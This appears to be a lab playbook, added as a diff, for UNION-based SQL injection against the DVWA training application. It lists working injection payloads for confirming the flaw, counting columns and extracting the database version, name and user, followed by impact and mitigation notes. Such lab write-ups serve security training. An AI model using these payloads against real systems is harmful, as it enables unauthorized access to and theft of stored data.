@@ -1,0 +1,105 @@
+==================================================
+UNION SQL INJECTION PLAYBOOK
+==================================================
+
+Lab Name:
+DVWA (Damn Vulnerable Web Application)
+
+Vulnerability:
+UNION-Based SQL Injection
+
+Objective:
+Identify SQL Injection vulnerability and extract database information using UNION SELECT.
+
+--------------------------------------------------
+Environment
+--------------------------------------------------
+
+Target:
+DVWA
+
+Platform:
+Windows 10 (XAMPP)
+
+Attacker Machine:
+Kali Linux / Browser
+
+Security Level:
+Low
+
+--------------------------------------------------
+Testing Steps
+--------------------------------------------------
+
+1. Open DVWA.
+2. Navigate to SQL Injection module.
+3. Test normal input:
+   1
+
+4. Confirm SQL Injection using:
+   1' OR '1'='1
+
+5. Determine number of columns:
+   1' ORDER BY 1-- -
+   1' ORDER BY 2-- -
+   1' ORDER BY 3-- -
+
+6. Test UNION injection:
+   1' UNION SELECT 1,2-- -
+
+7. Extract database information:
+   1' UNION SELECT @@version,database()-- -
+
+8. Extract current database user:
+   1' UNION SELECT user(),database()-- -
+
+--------------------------------------------------
+Successful Payloads
+--------------------------------------------------
+
+1' OR '1'='1
+
+1' ORDER BY 1-- -
+
+1' ORDER BY 2-- -
+
+1' UNION SELECT 1,2-- -
+
+1' UNION SELECT @@version,database()-- -
+
+1' UNION SELECT user(),database()-- -
+
+--------------------------------------------------
+Expected Result
+--------------------------------------------------
+
+• SQL Injection confirmed.
+• UNION SELECT executed successfully.
+• Database version displayed.
+• Database name displayed.
+• Current database user displayed.
+
+--------------------------------------------------
+Impact
+--------------------------------------------------
+
+An attacker may:
+
+• Read sensitive database information.
+• Enumerate database structure.
+• Extract usernames and passwords.
+• Bypass intended data access restrictions.
+
+--------------------------------------------------
+Mitigation
+--------------------------------------------------
+
+• Use Prepared Statements (Parameterized Queries).
+• Validate all user input.
+• Apply Least Privilege on database accounts.
+• Hide detailed SQL errors.
+• Use Web Application Firewall (WAF).
+
+==================================================
+Status: SUCCESS
+==================================================
